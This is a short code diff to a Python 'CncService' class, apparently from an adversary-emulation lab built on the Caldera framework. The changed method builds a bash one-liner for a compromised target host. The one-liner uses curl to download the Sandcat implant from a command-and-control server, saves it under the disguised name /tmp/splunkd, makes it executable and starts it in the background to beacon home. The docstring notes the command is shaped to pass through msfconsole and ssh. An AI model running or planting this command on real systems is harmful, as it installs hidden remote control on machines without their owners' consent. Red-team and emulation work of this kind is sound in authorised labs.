@@ -87,15 +87,16 @@ class CncService:
     def agent_deploy_command(self, group: str,
                              server_url: str = "http://host.docker.internal:8888") -> str:
         """
-        Bash command that downloads the (arm64) Sandcat implant and runs it in the
-        background, beaconing to Caldera under `group`. Run this ON the target host
-        via the initial-access channel (WebShell / SshRunner). `server_url` must be
-        reachable FROM the target container (host.docker.internal on Docker Desktop).
+        Bash command that downloads the Sandcat implant (auto-detects arm64/amd64) and
+        runs it in the background, beaconing to Caldera under `group`. Run this ON the
+        target host via the initial-access channel (WebShell / SshRunner). `server_url`
+        must be reachable FROM the target container.
         No ';' / no double-quotes so it survives passing through msfconsole + ssh.
         """
         return (
             f"server={server_url} "
-            "&& curl -s -X POST -H 'file:sandcat.go' -H 'platform:linux' $server/file/download > /tmp/splunkd "
+            "&& ARCH=$(uname -m | sed \"s/x86_64/amd64/;s/aarch64/arm64/\") "
+            "&& curl -s -X POST -H \"file:sandcat.go\" -H \"platform:linux\" -H \"architecture:$ARCH\" $server/file/download > /tmp/splunkd "
             "&& chmod +x /tmp/splunkd "
             f"&& ( nohup /tmp/splunkd -server $server -group {group} >/tmp/sandcat.log 2>&1 </dev/null & ) "
             "&& echo LAUNCHED"
